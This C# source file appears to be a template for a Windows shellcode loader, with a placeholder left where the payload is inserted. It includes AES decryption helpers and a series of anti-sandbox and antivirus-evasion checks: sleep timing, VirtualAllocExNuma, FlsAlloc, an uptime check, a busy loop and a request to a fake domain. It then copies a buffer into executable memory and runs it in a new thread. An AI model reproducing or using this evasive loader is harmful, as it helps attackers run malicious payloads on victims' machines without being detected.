using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Net;

namespace StandardExecutable
{
	public class SimpleAES
  {
      private AesCryptoServiceProvider _aes;
      private ICryptoTransform _crypto;

      public SimpleAES(string KEY, string IV)
      {
          _aes = new AesCryptoServiceProvider();
          _aes.BlockSize = 128;
          _aes.KeySize = 128;
          _aes.Key = ASCIIEncoding.ASCII.GetBytes(KEY);
          _aes.IV = ASCIIEncoding.ASCII.GetBytes(IV);
          _aes.Padding = PaddingMode.PKCS7;
          _aes.Mode = CipherMode.CBC;
      }

      public byte[] decrypt(string message)
      {
          _crypto = _aes.CreateDecryptor(_aes.Key, _aes.IV);
          byte[] decrypted = _crypto.TransformFinalBlock(System.Convert.FromBase64String(message), 0, System.Convert.FromBase64String(message).Length);
          _crypto.Dispose();
          return decrypted;
      }
  }
	class Program
	{
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

		[DllImport("kernel32.dll")]
		static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("kernel32.dll")]
		static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred); //Anti-AV emulator

		[DllImport("kernel32.dll")]
		static extern IntPtr FlsAlloc(IntPtr callback);

		[DllImport("kernel32.dll")]
		static extern uint GetTickCount();

		[DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

		static void Main(string[] args)
		{
			Console.WriteLine("[+] Validating Environment...");

      DateTime t1 = DateTime.Now;
      Sleep(2000);
      double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
      if (t2 < 1.5)
      {
          Environment.Exit(0);
      }
      Console.WriteLine("\t|_Date Time: " + t2);

      IntPtr VirtualAllocExNumaMem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);

      if (VirtualAllocExNumaMem == null)
      {
          Environment.Exit(0);
      }
      Console.WriteLine("\t|_VirtualAllocExNumaMem: " + VirtualAllocExNumaMem);

      IntPtr FlsAllocMem = FlsAlloc(IntPtr.Zero);
      if (FlsAllocMem == null)
      {
          Environment.Exit(0);
      }
      Console.WriteLine("\t|_FlsAlloc: " + FlsAlloc(IntPtr.Zero));

      if (GetTickCount() < 60000)
      {
          Environment.Exit(0);
      }
      Console.WriteLine("\t|_GetTickCount: " + GetTickCount());

      int manyrun = 0;
      for (int z = 0; z < 100000000; z++)
      {
          manyrun++;
      }
      Console.WriteLine("\t|_LoopCheck: " + manyrun);
      if (manyrun == 100000000)
      {
              try
              {
                  var fakeKey = new WebClient().DownloadString("http://ioashndoiasnddhaposdmawpidnaspidmwneionioasndoiasndpspodmadmasaadhjpoadelnbjkbnsa=asdasnmdpasjdpasdnfnpfnouahd/key.txt");
              }
              catch(Exception e)
              {

							{{{PayloadMethod}}}

			  			int size = buf.Length;
			  			IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
			  			Marshal.Copy(buf, 0, addr, size);
			  			IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
			  			WaitForSingleObject(hThread, 0xFFFFFFFF);
      	}
			}
		}
	}
}
